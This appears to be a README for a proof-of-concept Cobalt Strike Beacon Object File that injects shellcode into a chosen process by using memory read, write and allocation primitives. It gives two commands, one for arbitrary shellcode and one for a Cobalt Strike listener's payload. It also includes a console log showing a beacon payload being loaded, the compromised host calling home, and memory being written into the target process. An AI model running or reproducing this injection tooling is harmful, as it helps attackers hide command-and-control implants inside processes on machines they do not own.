# PrimitiveInjection
PrimitiveInjection BOF POC by using Read, Write and Allocation Primitives.  

## Usage

This BOF registers 2 commands,  
primitive_shinject to inject any shellcode to a PID.
```
primitive_shinject PID path_to_bin
3/08 13:06:21 UTC [task] <> Primitive Injection (thanos)
03/08 13:06:21 UTC [task] <> Reading shellcode from: /home/test/beacon.bin
03/08 13:06:27 UTC [checkin] host called home, sent: 321455 bytes
03/08 13:06:28 UTC [output]
received output:
[+] Peb Address: 0x0000000001118000


03/08 13:06:28 UTC [output]
received output:
[+] Read 8 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Heap Base Addr: 0000000001330000


03/08 13:06:28 UTC [output]
received output:
[+] Heap Allocation: 000000000A0FBBB0


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 1232 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 8 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Heap Allocation: 000000000169AD30


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 1232 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 8 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Heap Allocation: 000000000169C700


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 1232 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 8 bytes


03/08 13:06:28 UTC [output]
received output:
[+] Wrote 312271 bytes
```
primitive_inject to inject to a PID the shellcode of a listener in cobalt
```
primitive_inject PID listener_name
```

